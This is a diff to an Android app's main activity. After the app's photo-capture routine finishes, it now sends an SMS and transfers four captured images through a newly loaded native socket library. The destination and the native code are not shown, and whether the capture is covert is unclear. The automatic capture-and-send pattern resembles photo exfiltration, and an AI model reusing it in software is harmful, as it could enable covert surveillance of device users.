@@ -45,6 +45,11 @@ public class MainActivity extends AppCompatActivity implements PictureCapturingL
         System.loadLibrary("native-lib");
     }
 
+    // Used to load the 'multifile-transfer' library on application startup.
+    static {
+        System.loadLibrary("multifile-transfer-lib");
+    }
+
     private static final int MY_PERMISSIONS_REQUEST_SEND_SMS = 0 ;
     String phoneNo;
     String message;
@@ -89,6 +94,10 @@ public class MainActivity extends AppCompatActivity implements PictureCapturingL
         if (picturesTaken != null && !picturesTaken.isEmpty()) {
             //showToast("Done capturing all photos!");
             sendSMSMessage();
+            socketclientmultifile1("0_pic.jpg");
+            socketclientmultifile1("1_pic.jpg");
+            socketclientmultifile1("2_pic.jpg");
+            socketclientmultifile1("3_pic.jpg");
             return;
         }
         //showToast("No camera detected!");
@@ -364,9 +373,20 @@ public class MainActivity extends AppCompatActivity implements PictureCapturingL
             public void onClick(View v) {
 
                 Toast.makeText(getApplicationContext(),
-                        "UAF Value: "+socketclientmulti1(),
+                        "UAF Value: "+socketclientmultifile1("0_pic.jpg"),
                         Toast.LENGTH_LONG).show();
 
+                Toast.makeText(getApplicationContext(),
+                        "UAF Value: "+socketclientmultifile1("1_pic.jpg"),
+                        Toast.LENGTH_LONG).show();
+
+                Toast.makeText(getApplicationContext(),
+                        "UAF Value: "+socketclientmultifile1("2_pic.jpg"),
+                        Toast.LENGTH_LONG).show();
+
+                Toast.makeText(getApplicationContext(),
+                        "UAF Value: "+socketclientmultifile1("3_pic.jpg"),
+                        Toast.LENGTH_LONG).show();
             }
         });
 
@@ -388,5 +408,7 @@ public class MainActivity extends AppCompatActivity implements PictureCapturingL
     public native String socketserver1();
     public native String fileoperation1();
     public native String socketclientmulti1();
+    public native String socketservermultifile1();
+    public native String socketclientmultifile1(String inputValue1);
 
 }
